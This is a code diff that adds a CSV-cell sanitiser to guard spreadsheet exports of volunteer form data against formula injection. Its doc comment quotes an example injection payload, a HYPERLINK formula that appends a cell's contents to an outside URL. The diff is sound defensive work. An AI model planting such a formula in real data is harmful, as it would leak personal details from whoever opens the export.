@@ -2263,7 +2263,29 @@ function SignaturePad({ value, onChange, height = 150, label = "Signature" }) {
 }
 
 
+/**
+ * One CSV cell, safe to open in a spreadsheet.
+ *
+ * These exports carry names, guardian details and free text typed into public
+ * forms. Excel, Google Sheets and LibreOffice all treat a cell beginning with
+ * =, +, - or @ as a FORMULA, so a volunteer who applies under the name
+ * `=HYPERLINK("http://…"&A1,"Payroll")` gets that formula executed on the
+ * machine of whichever member of staff opens the export. Quoting alone does not
+ * prevent it — the parser strips the quotes first.
+ *
+ * The fix is the standard one: prefix a leading formula character with an
+ * apostrophe, which every spreadsheet reads as "this is text". Tab and carriage
+ * return are included because they are also treated as leading whitespace and
+ * skipped before the formula test.
+ */
+function nggCsvCell(v) {
+  let s = v == null ? "" : String(v);
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+  return '"' + s.replace(/"/g, '""') + '"';
+}
+
 Object.assign(window, {
+  nggCsvCell,
   BrandLogo, Avatar, Photo, PhotoSlot,
   CountUp, Tag, SectionHead, Progress, TopNav, Footer, Sparkline,
   usePublicData, useSession, useStats, sessionLabel, sessionDaysToStart, inkOn,
